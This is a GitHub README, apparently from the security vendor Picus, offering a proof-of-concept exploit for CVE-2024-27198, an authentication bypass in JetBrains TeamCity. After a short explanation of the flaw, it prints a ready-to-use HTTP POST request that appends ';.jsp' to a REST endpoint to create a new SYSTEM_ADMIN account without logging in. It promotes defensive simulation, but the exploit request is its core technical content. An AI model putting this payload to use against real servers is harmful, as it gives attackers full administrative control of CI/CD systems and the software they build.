# JetBrains TeamCity CVE-2024-27198 PoC Exploit
Recently, JetBrains disclosed a critical vulnerability affecting JetBrains TeamCity CI/CD server products.<br><br>
In this repo, Picus provides Proof-of-Concept exploit for the CVE-2024-27198 vulnerability.

Test security controls against the CVE-2024-27198 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2024-27198 vulnerability exploits for free. No setup or signup required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 

If you are looking for more detailed information check out our blog post: [CVE-2024-27198 and CVE-2024-27199: JetBrains TeamCity Authentication Bypass Vulnerabilities Explained](https://www.picussecurity.com/resource/blog/cve-2024-27198-cve-2024-27199)

CVE-2024-27198 Proof-of-concept (POC)
----------------------
CVE-2024-27198 vulnerability is caused by a CWE-288 weakness found in BaseController class of web-openapi.jar library. When an API endpoint receives a request appended with. jsp, the BaseController class allows the request to bypass authentication.
The example HTTP POST request below exploits CVE-2024-27198 vulnerability to add a new administrator user. Note the ";.jsp" located after the API endpoint.

As a PoC there is a python file that automates the process. 

#### Example CVE-2024-27198 Exploit:
```http
POST /notexist?jsp=/app/rest/users;.jsp HTTP/1.1
Content-Type: application/json
Content-Length: 120

{"username": "test", "password": "test", "email": "test", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}
```

Disclaimer
----------
We do not have any disclamer.
